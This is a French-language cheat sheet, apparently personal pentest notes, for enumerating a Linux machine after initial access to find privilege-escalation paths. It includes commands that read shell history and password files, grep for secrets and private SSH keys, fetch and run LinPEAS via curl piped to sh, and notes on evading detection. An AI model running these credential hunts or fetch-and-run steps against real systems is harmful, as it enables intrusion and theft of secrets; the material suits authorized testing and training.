**Objectif :** L'énumération sur un système Linux après un accès initial est cruciale pour comprendre l'environnement, identifier les mauvaises configurations, trouver des informations sensibles et découvrir des vecteurs potentiels d'escalade de privilèges (PrivEsc).

---

### ℹ️ **Informations Système et OS**

* **Objectif :** Comprendre la nature du système (distribution, version, architecture, kernel). Utile pour rechercher des exploits spécifiques au kernel ou à la distribution.

```bash
# Nom d'hôte
hostname

# Informations sur la distribution
cat /etc/issue
cat /etc/*-release
lsb_release -a

# Informations sur le Kernel
uname -a
uname -r # Version du kernel seule
cat /proc/version

# Informations CPU
lscpu

# Informations sur les périphériques bloc (disques, partitions)
lsblk

# Systèmes de fichiers montés et espace disque
df -h
mount
cat /etc/fstab # Configuration statique des points de montage
````

### 👤 **Informations Utilisateur et Groupe**

- **Objectif :** Identifier l'utilisateur actuel, ses privilèges, les autres utilisateurs présents, et les groupes existants.
    

```
# Qui suis-je ? (utilisateur actuel)
whoami
id

# Utilisateurs actuellement connectés
w
who

# Dernières connexions utilisateur
last

# Groupes de l'utilisateur actuel
groups

# Lister tous les utilisateurs locaux
cat /etc/passwd | cut -d: -f1
ls /home

# Lister tous les groupes locaux
cat /etc/group | cut -d: -f1

# Historique des commandes (peut contenir des mots de passe !)
history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.ash_history # etc.
```

### 🌐 **Informations Réseau**

- **Objectif :** Comprendre la configuration réseau de la machine, les services en écoute, et les connexions établies.
    

```
# Configuration des interfaces réseau (IP, MAC)
ip a
ifconfig # Ancien, peut ne pas être installé

# Table de routage
ip r
route -n # Ancien

# Connexions réseau actives (TCP, UDP), services en écoute
# ss est plus moderne que netstat
ss -tulpn
netstat -tulpn # Peut nécessiter l'installation de net-tools

# Informations DNS
cat /etc/resolv.conf

# Fichier hosts (peut révéler d'autres machines sur le réseau)
cat /etc/hosts
```

### ⚙️ **Processus et Services en Cours**

- **Objectif :** Identifier les processus actifs, les services qui tournent, et les utilisateurs qui les exécutent. Peut révéler des services personnalisés ou mal configurés.
    

```
# Lister tous les processus (différents formats)
ps aux
ps auxf # Avec arborescence
ps -ef

# Visualiser les processus en temps réel (utilisation CPU/Mémoire)
top
htop # Plus interactif, peut nécessiter une installation

# Lister les services (Systemd)
systemctl list-units --type=service --state=running

# Lister les services (Ancien init.d)
service --status-all # Fonctionne sur certains systèmes
ls -l /etc/init.d/
```

### ⏰ **Tâches Planifiées (Cron Jobs & Timers)**

- **Objectif :** Trouver des scripts ou commandes exécutés automatiquement à intervalles réguliers, potentiellement avec des privilèges élevés ou via des scripts modifiables.
    

```
# Tâches cron de l'utilisateur actuel
crontab -l

# Tâches cron système
cat /etc/crontab
ls -l /etc/cron.* # Vérifier les dossiers cron.d, cron.hourly, etc.

# Tâches cron des autres utilisateurs (nécessite des privilèges)
cat /var/spool/cron/crontabs/*

# Timers Systemd (alternative moderne à cron)
systemctl list-timers --all
```

### 🔑 **Permissions et Vecteurs de PrivEsc Potentiels**

- **Objectif :** Identifier les failles de configuration classiques permettant une élévation de privilèges.
    

```
# Vérifier les droits sudo de l'utilisateur actuel
sudo -l

# Rechercher les binaires avec le bit SUID (s'exécutent en tant que propriétaire, souvent root)
# Attention: peut être long et générer beaucoup de logs/charge
find / -type f -perm -4000 -ls 2>/dev/null

# Rechercher les binaires avec le bit SGID (s'exécutent avec les droits du groupe propriétaire)
find / -type f -perm -2000 -ls 2>/dev/null

# Rechercher les "capabilities" (mécanisme de privilèges fins sous Linux)
getcap -r / 2>/dev/null

# Rechercher les dossiers/fichiers modifiables par l'utilisateur actuel (World-writable ou appartenant à l'utilisateur/groupe)
# Attention: peut être très long
find / -writable -type d 2>/dev/null # Dossiers modifiables
find / -perm -o+w -type d 2>/dev/null # Dossiers world-writable
find / -perm -o+w -type f 2>/dev/null # Fichiers world-writable

# Vérifier si des chemins dans $PATH sont modifiables
echo $PATH | tr ':' '\n' | while read path; do ls -ld $path; done

# Lister les paquets installés (pour rechercher des versions vulnérables)
dpkg -l # Debian/Ubuntu
rpm -qa # CentOS/Fedora/RHEL
```

> [!Astuce]
> 
> Croisez les résultats des SUID/SGID/Capabilities avec GTFOBins pour voir s'ils peuvent être abusés pour obtenir un shell ou élever les privilèges.

### 📂 **Recherche de Fichiers et Données Sensibles**

- **Objectif :** Trouver des fichiers de configuration, des scripts, des clés, des mots de passe codés en dur, ou d'autres informations utiles.
    

```
# Rechercher des fichiers de configuration courants
find /etc -name "*.conf" 2>/dev/null
find / -name "*config*" -type f 2>/dev/null

# Rechercher des fichiers modifiés récemment (ex: les 10 derniers jours)
find / -mtime -10 2>/dev/null

# Rechercher des mots-clés sensibles (password, secret, key, api_key, etc.) dans des fichiers
# Attention: commandes potentiellement très longues et gourmandes
grep -RiE '(password|secret|key)' /etc 2>/dev/null
grep -RiE '(password|secret|key)' /var/www 2>/dev/null # Si un serveur web est présent
grep -RiE '(password|secret|key)' /home 2>/dev/null

# Rechercher des clés SSH privées
find / -name "id_rsa" 2>/dev/null
ls -la ~/.ssh/

# Rechercher des scripts (.sh, .py, .pl, etc.)
find / -name "*.sh" 2>/dev/null
find / -name "*.py" 2>/dev/null

# Vérifier les logs (peuvent contenir des erreurs révélatrices ou des infos sensibles)
ls -l /var/log/
```

### 🤖 **Scripts d'Énumération Automatisée**

- **Objectif :** Utiliser des scripts pré-faits pour automatiser une grande partie de l'énumération. Très utiles pour gagner du temps et couvrir un large spectre de vérifications rapidement.
    
- **LinEnum.sh:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum "null")
    
    ```
    # Télécharger et exécuter
    wget [https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) -O /tmp/linenum.sh
    chmod +x /tmp/linenum.sh
    /tmp/linenum.sh -t # Option -t pour inclure les tests plus poussés (thorough)
    ```
    
    - **Description :** Un script shell classique et fiable qui effectue une série de vérifications système, réseau, utilisateur, et permissions. Moins "agressif" que LinPEAS mais couvre bien les bases. L'option `-t` ajoute des recherches plus approfondies (ex: SUID/SGID).
        
- **LinPEAS:** [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS "null")
    
    ```
    # Télécharger et exécuter
    wget [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) -O /tmp/linpeas.sh
    chmod +x /tmp/linpeas.sh
    /tmp/linpeas.sh > /tmp/linpeas_output.txt # Rediriger la sortie vers un fichier pour analyse
    # Alternativement, pour une exécution moins bruyante sur le disque :
    # curl [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) | sh
    ```
    
    - **Description :** LinPEAS (Linux Privilege Escalation Awesome Script) est l'un des scripts d'énumération les plus populaires et complets. Il effectue une multitude de vérifications pour identifier rapidement les informations système, les configurations potentiellement faibles, et surtout les vecteurs d'escalade de privilèges.
        
    - **Fonctionnalités Clés :** Il est particulièrement reconnu pour sa sortie colorée qui met en évidence les informations jugées intéressantes ou critiques (souvent en jaune/rouge), facilitant l'identification rapide des points d'intérêt. LinPEAS vérifie en profondeur les permissions SUID/SGID (en les croisant avec GTFOBins), les capabilities, les tâches cron, les services systemd, les fichiers/dossiers inscriptibles, les informations réseau, les secrets potentiels dans les fichiers de configuration ou l'historique, les informations sur les conteneurs (Docker, LXC), les vulnérabilités connues du kernel, et bien plus encore.
        
    - **Interprétation & OPSEC :** En raison de son exhaustivité, LinPEAS génère une sortie très volumineuse. Il est fortement recommandé de rediriger cette sortie vers un fichier (`> /tmp/linpeas_output.txt`) pour pouvoir l'analyser tranquillement avec des outils comme `less` ou `grep`. Soyez conscient que son exécution peut être gourmande en ressources et que sa signature est bien connue des outils de détection (EDR/AV), bien que des versions obfusquées existent. Notez qu'il existe également une version pour Windows, WinPEAS, tout aussi complète.
        
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester "null")
    
    ```
    # Télécharger et exécuter
    wget [https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh) -O /tmp/les.sh
    chmod +x /tmp/les.sh
    /tmp/les.sh
    ```
    
    - **Description :** Ce script se concentre spécifiquement sur l'identification d'exploits potentiels pour le kernel Linux en se basant sur la version du kernel (`uname -r`). Il compare la version détectée avec une base de données d'exploits connus. Utile pour une vérification rapide des vulnérabilités du noyau.
        

> [!Attention]
> 
> Les scripts automatisés sont excellents mais peuvent générer beaucoup de "bruit" et de faux positifs. 